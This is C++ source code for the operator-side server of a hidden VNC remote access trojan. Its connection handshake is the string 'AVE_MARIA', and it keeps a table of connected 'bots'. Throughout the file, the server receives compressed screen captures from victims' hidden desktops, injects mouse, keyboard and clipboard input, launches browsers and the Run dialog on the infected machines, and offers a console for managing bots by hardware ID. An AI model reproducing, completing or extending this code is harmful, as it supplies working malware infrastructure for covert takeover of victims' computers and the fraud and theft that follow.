#include "Server.h"
#include <iostream>
#include <string>
#include <Shlwapi.h>

typedef NTSTATUS(NTAPI *T_RtlDecompressBuffer)
(
	USHORT CompressionFormat,
	PUCHAR UncompressedBuffer,
	ULONG  UncompressedBufferSize,
	PUCHAR CompressedBuffer,
	ULONG  CompressedBufferSize,
	PULONG FinalUncompressedSize
	);

static T_RtlDecompressBuffer pRtlDecompressBuffer;

enum Connection { desktop, input, end };

struct Client
{
	SOCKET connections[Connection::end];
	DWORD  uhid;
	HWND   hWnd;
	BYTE  *pixels;
	DWORD  pixelsWidth, pixelsHeight;
	DWORD  screenWidth, screenHeight;
	HDC    hDcBmp;
	HANDLE minEvent;
	BOOL   fullScreen;
	RECT   windowedRect;
	CHAR* bot_id;
};

static const COLORREF gc_trans = RGB(255, 174, 201);
static const BYTE     gc_magik[] = { 'A', 'V', 'E', '_', 'M', 'A', 'R', 'I', 'A', 0 };
static const DWORD    gc_maxClients = 655656;
static const DWORD    gc_sleepNotRecvPixels = 33;

static const DWORD    gc_minWindowWidth = 800;
static const DWORD    gc_minWindowHeight = 600;

int cur_clients = 0;

enum SysMenuIds { fullScreen = 101, startExplorer = WM_USER + 1, startRun, startChrome, startFirefox, startIexplore, startUninstall, startCtrlV };

static Client           g_clients[gc_maxClients];
static CRITICAL_SECTION g_critSec;

static Client *GetClient(void *data, BOOL uhid)
{
	for (int i = 0; i < gc_maxClients; ++i)
	{
		if (uhid)
		{
			if (lstrcmpA(g_clients[i].bot_id, (CHAR*)data) == 0)
				return &g_clients[i];
		}
		else
		{
			if (g_clients[i].hWnd == (HWND)data)
				return &g_clients[i];
		}
	}
	return NULL;
}

int SendInt(SOCKET s, int i)
{
	return send(s, (char *)&i, sizeof(i), 0);
}

static BOOL SendInput(SOCKET s, UINT msg, WPARAM wParam, LPARAM lParam)
{
	if (SendInt(s, msg) <= 0)
		return FALSE;
	if (SendInt(s, wParam) <= 0)
		return FALSE;
	if (SendInt(s, lParam) <= 0)
		return FALSE;
	return TRUE;
}

static void ToggleFullscreen(HWND hWnd, Client *client)
{
	if (!client->fullScreen)
	{
		RECT rect;
		GetWindowRect(hWnd, &rect);
		client->windowedRect = rect;
		GetWindowRect(GetDesktopWindow(), &rect);
		SetWindowLong(hWnd, GWL_STYLE, WS_POPUP | WS_VISIBLE);
		SetWindowPos(hWnd, HWND_TOPMOST, 0, 0, rect.right, rect.bottom, SWP_SHOWWINDOW);
	}
	else
	{
		SetWindowLong(hWnd, GWL_STYLE, WS_OVERLAPPEDWINDOW | WS_VISIBLE);
		SetWindowPos(hWnd,
			HWND_NOTOPMOST,
			client->windowedRect.left,
			client->windowedRect.top,
			client->windowedRect.left - client->windowedRect.right,
			client->windowedRect.bottom - client->windowedRect.top,
			SWP_SHOWWINDOW);
	}
	client->fullScreen = !client->fullScreen;
}

static LRESULT CALLBACK WndProc(HWND hWnd, UINT msg, WPARAM wParam, LPARAM lParam)
{
	Client *client = GetClient(hWnd, FALSE);

	switch (msg)
	{
	case WM_CREATE:
	{
		HMENU hSysMenu = GetSystemMenu(hWnd, false);
		AppendMenu(hSysMenu, MF_SEPARATOR, 0, NULL);
		//AppendMenu(hSysMenu, MF_STRING, SysMenuIds::fullScreen,     TEXT("&Fullscreen"));
		AppendMenu(hSysMenu, MF_STRING, SysMenuIds::startExplorer, TEXT("Run Explorer"));
		AppendMenu(hSysMenu, MF_STRING, SysMenuIds::startRun, TEXT("&Run..."));
		AppendMenu(hSysMenu, MF_STRING, SysMenuIds::startChrome, TEXT("Run Chrome"));
		AppendMenu(hSysMenu, MF_STRING, SysMenuIds::startFirefox, TEXT("Run Firefox"));
		AppendMenu(hSysMenu, MF_STRING, SysMenuIds::startIexplore, TEXT("Run Internet Explorer"));
		AppendMenu(hSysMenu, MF_STRING, SysMenuIds::startUninstall, TEXT("Run Uninstall"));
		AppendMenu(hSysMenu, MF_STRING, SysMenuIds::startCtrlV, TEXT("Ctrl + V"));
		break;
	}
	case WM_SYSCOMMAND:
	{
		if (wParam == SC_RESTORE)
			SetEvent(client->minEvent);
		/*
				 else if(wParam == SysMenuIds::fullScreen || (wParam == SC_KEYMENU && toupper(lParam) == 'F'))
				 {
					ToggleFullscreen(hWnd, client);
					break;
				 }
		*/
		else if (wParam == SysMenuIds::startExplorer)
		{
			EnterCriticalSection(&g_critSec);
			if (!SendInput(client->connections[Connection::input], SysMenuIds::startExplorer, NULL, NULL))
				PostQuitMessage(0);
			LeaveCriticalSection(&g_critSec);
			break;
		}
		else if (wParam == SysMenuIds::startRun)
		{
			EnterCriticalSection(&g_critSec);
			if (!SendInput(client->connections[Connection::input], SysMenuIds::startRun, NULL, NULL))
				PostQuitMessage(0);
			LeaveCriticalSection(&g_critSec);
			break;
		}
		else if (wParam == SysMenuIds::startChrome)
		{
			EnterCriticalSection(&g_critSec);
			if (!SendInput(client->connections[Connection::input], SysMenuIds::startChrome, NULL, NULL))
				PostQuitMessage(0);
			LeaveCriticalSection(&g_critSec);
			break;
		}
		else if (wParam == SysMenuIds::startFirefox)
		{
			EnterCriticalSection(&g_critSec);
			if (!SendInput(client->connections[Connection::input], SysMenuIds::startFirefox, NULL, NULL))
				PostQuitMessage(0);
			LeaveCriticalSection(&g_critSec);
			break;
		}
		else if (wParam == SysMenuIds::startIexplore)
		{
			EnterCriticalSection(&g_critSec);
			if (!SendInput(client->connections[Connection::input], SysMenuIds::startIexplore, NULL, NULL))
				PostQuitMessage(0);
			LeaveCriticalSection(&g_critSec);
			break;
		}
		else if (wParam == SysMenuIds::startUninstall)
		{
			EnterCriticalSection(&g_critSec);
			if (!SendInput(client->connections[Connection::input], SysMenuIds::startUninstall, NULL, NULL))
				PostQuitMessage(0);
			LeaveCriticalSection(&g_critSec);
			break;
		}
		else if (wParam == SysMenuIds::startCtrlV)
		{
			EnterCriticalSection(&g_critSec);

			WCHAR* clp = (WCHAR*)malloc(32767 * sizeof(WCHAR));
			memset(clp, 0x00, 32766);

			if (OpenClipboard(0))
			{
				HANDLE hData = GetClipboardData(CF_UNICODETEXT);
				WCHAR* chBuffer = (WCHAR*)GlobalLock(hData);
				wnsprintfW(clp, 32767, L"%s", chBuffer);
				GlobalUnlock(hData);
				CloseClipboard();
			}

			for (int c = 0; c < lstrlenW(clp); c++) {
				if (!SendInput(client->connections[Connection::input], WM_CHAR, clp[c], 0))
					PostQuitMessage(0);
				Sleep(10);
			}

			LeaveCriticalSection(&g_critSec);
			break;
		}
		return DefWindowProc(hWnd, msg, wParam, lParam);
	}
	case WM_PAINT:
	{
		PAINTSTRUCT ps;
		HDC         hDc = BeginPaint(hWnd, &ps);

		RECT clientRect;
		GetClientRect(hWnd, &clientRect);

		RECT rect;
		HBRUSH hBrush = CreateSolidBrush(RGB(0, 0, 0));
		rect.left = 0;
		rect.top = 0;
		rect.right = clientRect.right;
		rect.bottom = clientRect.bottom;

		rect.left = client->pixelsWidth;
		FillRect(hDc, &rect, hBrush);
		rect.left = 0;
		rect.top = client->pixelsHeight;
		FillRect(hDc, &rect, hBrush);
		DeleteObject(hBrush);

		BitBlt(hDc, 0, 0, client->pixelsWidth, client->pixelsHeight, client->hDcBmp, 0, 0, SRCCOPY);
		EndPaint(hWnd, &ps);
		break;
	}
	case WM_DESTROY:
	{
		PostQuitMessage(0);
		break;
	}
	case WM_ERASEBKGND:
		return TRUE;
	case WM_LBUTTONDOWN:
	case WM_LBUTTONUP:
	case WM_RBUTTONDOWN:
	case WM_RBUTTONUP:
	case WM_MBUTTONDOWN:
	case WM_MBUTTONUP:
	case WM_LBUTTONDBLCLK:
	case WM_RBUTTONDBLCLK:
	case WM_MBUTTONDBLCLK:
	case WM_MOUSEMOVE:
	case WM_MOUSEWHEEL:
	{
		if (msg == WM_MOUSEMOVE && GetKeyState(VK_LBUTTON) >= 0)
			break;

		int x = GET_X_LPARAM(lParam);
		int y = GET_Y_LPARAM(lParam);

		float ratioX = (float)client->screenWidth / client->pixelsWidth;
		float ratioY = (float)client->screenHeight / client->pixelsHeight;

		x = (int)(x * ratioX);
		y = (int)(y * ratioY);
		lParam = MAKELPARAM(x, y);
		EnterCriticalSection(&g_critSec);
		if (!SendInput(client->connections[Connection::input], msg, wParam, lParam))
			PostQuitMessage(0);
		LeaveCriticalSection(&g_critSec);
		break;
	}
	case WM_CHAR:
	{
		if (iscntrl(wParam))
			break;
		EnterCriticalSection(&g_critSec);
		if (!SendInput(client->connections[Connection::input], msg, wParam, 0))
			PostQuitMessage(0);
		LeaveCriticalSection(&g_critSec);
		break;
	}
	case WM_KEYDOWN:
	case WM_KEYUP:
	{
		switch (wParam)
		{
		case VK_UP:
		case VK_DOWN:
		case VK_RIGHT:
		case VK_LEFT:
		case VK_HOME:
		case VK_END:
		case VK_PRIOR:
		case VK_NEXT:
		case VK_INSERT:
		case VK_RETURN:
		case VK_DELETE:
		case VK_BACK:
			break;
		default:
			return 0;
		}
		EnterCriticalSection(&g_critSec);
		if (!SendInput(client->connections[Connection::input], msg, wParam, 0))
			PostQuitMessage(0);
		LeaveCriticalSection(&g_critSec);
		break;
	}
	case WM_GETMINMAXINFO:
	{
		if (!client)
			break;
		MINMAXINFO* mmi = (MINMAXINFO *)lParam;
		mmi->ptMinTrackSize.x = gc_minWindowWidth;
		mmi->ptMinTrackSize.y = gc_minWindowHeight;
		mmi->ptMaxTrackSize.x = client->screenWidth;
		mmi->ptMaxTrackSize.y = client->screenHeight;
		break;
	}
	default:
		return DefWindowProc(hWnd, msg, wParam, lParam);
	}
	return 0;
}

static DWORD WINAPI ClientThread(PVOID param)
{
	Client    *client = NULL;
	SOCKET     s = (SOCKET)param;
	BYTE       buf[sizeof(gc_magik)];
	BYTE       bot_id[35];
	Connection connection;
	CHAR*      uhid;
	DWORD uhid_addr;

	if (recv(s, (char *)buf, sizeof(gc_magik), 0) <= 0)
	{
		closesocket(s);
		return 0;
	}
	if (memcmp(buf, gc_magik, sizeof(gc_magik)))
	{
		closesocket(s);
		return 0;
	}
	//if (recv(s, (char *)bot_id, 35, 0) <= 0)
	//{
	//	closesocket(s);
	//	return 0;
	//}
	if (recv(s, (char *)&connection, sizeof(connection), 0) <= 0)
	{
		closesocket(s);
		return 0;
	}
	{
		SOCKADDR_IN addr;
		int         addrSize;
		addrSize = sizeof(addr);
		getpeername(s, (SOCKADDR *)&addr, &addrSize);
		uhid = (CHAR*)bot_id; 
		uhid_addr = addr.sin_addr.S_un.S_addr;
	}
	if (connection == Connection::desktop)
	{
		client = GetClient((void *)uhid, TRUE);
		if (!client)
		{
			closesocket(s);
			return 0;
		}
		client->connections[Connection::desktop] = s;

		BITMAPINFO bmpInfo;
		bmpInfo.bmiHeader.biSize = sizeof(bmpInfo.bmiHeader);
		bmpInfo.bmiHeader.biPlanes = 1;
		bmpInfo.bmiHeader.biBitCount = 24;
		bmpInfo.bmiHeader.biCompression = BI_RGB;
		bmpInfo.bmiHeader.biClrUsed = 0;

		for (;;)
		{
			RECT rect;
			GetClientRect(client->hWnd, &rect);

			if (rect.right == 0)
			{
				BOOL x = ResetEvent(client->minEvent);
				WaitForSingleObject(client->minEvent, 5000);
				continue;
			}

			int realRight = (rect.right > client->screenWidth && client->screenWidth > 0) ? client->screenWidth : rect.right;
			int realBottom = (rect.bottom > client->screenHeight && client->screenHeight > 0) ? client->screenHeight : rect.bottom;

			if ((realRight * 3) % 4)
				realRight += ((realRight * 3) % 4);

			if (SendInt(s, realRight) <= 0)
				goto exit;
			if (SendInt(s, realBottom) <= 0)
				goto exit;

			DWORD width;
			DWORD height;
			DWORD size;
			BOOL recvPixels;
			if (recv(s, (char *)&recvPixels, sizeof(recvPixels), 0) <= 0)
				goto exit;
			if (!recvPixels)
			{
				Sleep(gc_sleepNotRecvPixels);
				continue;
			}
			if (recv(s, (char *)&client->screenWidth, sizeof(client->screenWidth), 0) <= 0)
				goto exit;
			if (recv(s, (char *)&client->screenHeight, sizeof(client->screenHeight), 0) <= 0)
				goto exit;
			if (recv(s, (char *)&width, sizeof(width), 0) <= 0)
				goto exit;
			if (recv(s, (char *)&height, sizeof(height), 0) <= 0)
				goto exit;
			if (recv(s, (char *)&size, sizeof(size), 0) <= 0)
				goto exit;

			BYTE *compressedPixels = (BYTE *)malloc(size);
			int   totalRead = 0;
			do
			{
				int read = recv(s, (char *)compressedPixels + totalRead, size - totalRead, 0);
				if (read <= 0)
					goto exit;
				totalRead += read;
			} while (totalRead != size);

			EnterCriticalSection(&g_critSec);
			{
				DWORD newPixelsSize = width * 3 * height;
				BYTE *newPixels = (BYTE *)malloc(newPixelsSize);
				pRtlDecompressBuffer(COMPRESSION_FORMAT_LZNT1, newPixels, newPixelsSize, compressedPixels, size, &size);
				free(compressedPixels);

				if (client->pixels && client->pixelsWidth == width && client->pixelsHeight == height)
				{
					for (DWORD i = 0; i < newPixelsSize; i += 3)
					{
						if (newPixels[i] == GetRValue(gc_trans) &&
							newPixels[i + 1] == GetGValue(gc_trans) &&
							newPixels[i + 2] == GetBValue(gc_trans))
						{
							continue;
						}
						client->pixels[i] = newPixels[i];
						client->pixels[i + 1] = newPixels[i + 1];
						client->pixels[i + 2] = newPixels[i + 2];
					}
					free(newPixels);
				}
				else
				{
					free(client->pixels);
					client->pixels = newPixels;
				}

				HDC hDc = GetDC(NULL);
				HDC hDcBmp = CreateCompatibleDC(hDc);
				HBITMAP hBmp;

				hBmp = CreateCompatibleBitmap(hDc, width, height);
				SelectObject(hDcBmp, hBmp);

				bmpInfo.bmiHeader.biSizeImage = newPixelsSize;
				bmpInfo.bmiHeader.biWidth = width;
				bmpInfo.bmiHeader.biHeight = height;
				SetDIBits(hDcBmp,
					hBmp,
					0,
					height,
					client->pixels,
					&bmpInfo,
					DIB_RGB_COLORS);

				DeleteDC(client->hDcBmp);
				client->pixelsWidth = width;
				client->pixelsHeight = height;
				client->hDcBmp = hDcBmp;

				InvalidateRgn(client->hWnd, NULL, TRUE);

				DeleteObject(hBmp);
				ReleaseDC(NULL, hDc);
			}
			LeaveCriticalSection(&g_critSec);

			if (SendInt(s, 0) <= 0)
				goto exit;
		}
	exit:
		PostMessage(client->hWnd, WM_DESTROY, NULL, NULL);
		return 0;
	}
	else if (connection == Connection::input)
	{
		char ip[16];
		EnterCriticalSection(&g_critSec);
		{
			client = GetClient((void *)uhid, TRUE);
			if (client)
			{
				closesocket(s);
				LeaveCriticalSection(&g_critSec);
				return 0;
			}
			IN_ADDR addr;
			addr.S_un.S_addr = uhid_addr;
			strcpy_s(ip, inet_ntoa(addr));
			wprintf(TEXT("\nUser %S connected\n"), ip);
			cur_clients++;

			BOOL found = FALSE;
			for (int i = 0; i < gc_maxClients; ++i)
			{
				if (!g_clients[i].hWnd)
				{
					found = TRUE;
					client = &g_clients[i];
					printf("His id: %u\n\n$hvnc CMD->", i);
					break;
				}
			}
			if (!found)
			{
				wprintf(TEXT("User %S kicked max %d users\n$hvnc CMD->"), ip, gc_maxClients);
				cur_clients--;
				closesocket(s);
				return 0;
			}

			client->hWnd = CW_Create(uhid_addr, gc_minWindowWidth, gc_minWindowHeight);
			//ShowWindow(g_clients[0].hWnd, SW_SHOW); //WARN CAN ERROR
			client->uhid = uhid_addr;
			client->connections[Connection::input] = s;
			client->minEvent = CreateEventA(NULL, TRUE, FALSE, NULL);
			client->bot_id = (CHAR*)bot_id;
		}
		LeaveCriticalSection(&g_critSec);

		SendInt(s, 0);

		MSG msg;
		while (GetMessage(&msg, NULL, 0, 0) > 0)
		{
			PeekMessage(&msg, NULL, WM_USER, WM_USER, PM_NOREMOVE);
			TranslateMessage(&msg);
			DispatchMessage(&msg);
		}

		EnterCriticalSection(&g_critSec);
		{
			cur_clients--;
			wprintf(TEXT("User %S disconnected\n"), ip);
			free(client->pixels);
			DeleteDC(client->hDcBmp);
			closesocket(client->connections[Connection::input]);
			closesocket(client->connections[Connection::desktop]);
			CloseHandle(client->minEvent);
			memset(client, 0, sizeof(*client));
		}
		LeaveCriticalSection(&g_critSec);
	}
	return 0;
}

DWORD WINAPI ConsoleReader(LPVOID param)
{
	while (1) {
		std::string line;
		std::cout << "$hvnc CMD-> ";

		std::getline(std::cin, line);
		if (StrStrA(line.c_str(), "help")) {
			std::cout <<
				"\r\show [id] -> show special bot\r\n"
				"\r\hide [id] -> hide special bot\r\n"
				"\r\clients -> show all clients\r\n"
				"\r\getid -> get hwid of bot\r\n"
				"\r\search -> search bot by hwid\r\n"
				"clear -> clear console screen\r\n\r\n";
		}
		else if (StrStrA(line.c_str(), "show")) {
			char* id = StrStrA(line.c_str(), " ");
			if (id) id += 1;
			int int_id = atoi(id);
			ShowWindow(g_clients[int_id].hWnd, SW_SHOW);
			if (g_clients[int_id].hWnd != NULL) printf("Done!\n\n"); else printf("Not found!\n\n");
		}
		else if (StrStrA(line.c_str(), "hide")) {
			char* id = StrStrA(line.c_str(), " ");
			if (id) id += 1;
			int int_id = atoi(id);
			ShowWindow(g_clients[int_id].hWnd, SW_HIDE);
			if (g_clients[int_id].hWnd != NULL) printf("Done!\n\n"); else printf("Not found!\n\n");
		}
		else if (StrStrA(line.c_str(), "clients")) {
			printf("Clients id's: ");
			for (int i = 0; i < gc_maxClients; i++) {
				if (g_clients[i].hWnd != NULL) printf("%u ", i);
			}
			printf("\n\n");
		}
		else if (StrStrA(line.c_str(), "getid")) {
			char* id = StrStrA(line.c_str(), " ");
			if (id) id += 1;
			int int_id = atoi(id);
			if (g_clients[int_id].bot_id != NULL) printf("Bot hwid: %s\n\n", g_clients[int_id].bot_id); else printf("Not found!\n\n");
		}
		else if (StrStrA(line.c_str(), "search")) {
			printf("Searching..\n\n");
			char* id = StrStrA(line.c_str(), " ");
			if (id) id += 1;
			for (int i = 0; i < gc_maxClients; i++) {
				if (g_clients[i].bot_id != NULL) {
					if (lstrcmpA(g_clients[i].bot_id, id) == 0) printf("Id: %u\n\n", i);
				}
			}
			printf("Search ended.\n\n");
		}
		else if (StrStrA(line.c_str(), "clear")) {
			system("cls");
		}
	}
}

DWORD WINAPI ConsoleTitleUpdater(LPVOID param) {
	while (1) {
		char* cur_clients_mem = (char*)malloc(26);
		wnsprintfA(cur_clients_mem, 26, "Current clients count <%u>", cur_clients);
		SetConsoleTitleA(cur_clients_mem);
		free(cur_clients_mem);
		Sleep(1000);
	}
}

BOOL StartServer(int port)
{
	WSADATA     wsa;
	SOCKET      serverSocket;
	sockaddr_in addr;
	HMODULE     ntdll = LoadLibrary(TEXT("ntdll.dll"));

	pRtlDecompressBuffer = (T_RtlDecompressBuffer)GetProcAddress(ntdll, "RtlDecompressBuffer");
	InitializeCriticalSection(&g_critSec);
	memset(g_clients, 0, sizeof(g_clients));
	CW_Register(WndProc);

	if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0)
		return FALSE;
	if ((serverSocket = socket(AF_INET, SOCK_STREAM, 0)) == INVALID_SOCKET)
		return FALSE;

	addr.sin_family = AF_INET;
	addr.sin_addr.s_addr = INADDR_ANY;
	addr.sin_port = htons(port);

	if (bind(serverSocket, (sockaddr *)&addr, sizeof(addr)) == SOCKET_ERROR)
		return FALSE;
	if (listen(serverSocket, SOMAXCONN) == SOCKET_ERROR)
		return FALSE;

	int addrSize = sizeof(addr);
	getsockname(serverSocket, (sockaddr *)&addr, &addrSize);
	wprintf(TEXT("Waiting for clients on port %d\n"), ntohs(addr.sin_port));

	CreateThread(NULL, 0, ConsoleReader, NULL, 0, 0);
	CreateThread(NULL, 0, ConsoleTitleUpdater, NULL, 0, 0);

	for (;;)
	{
		SOCKET      s;
		sockaddr_in addr;
		s = accept(serverSocket, (sockaddr *)&addr, &addrSize);
		CreateThread(NULL, 0, ClientThread, (LPVOID)s, 0, 0);
	}
}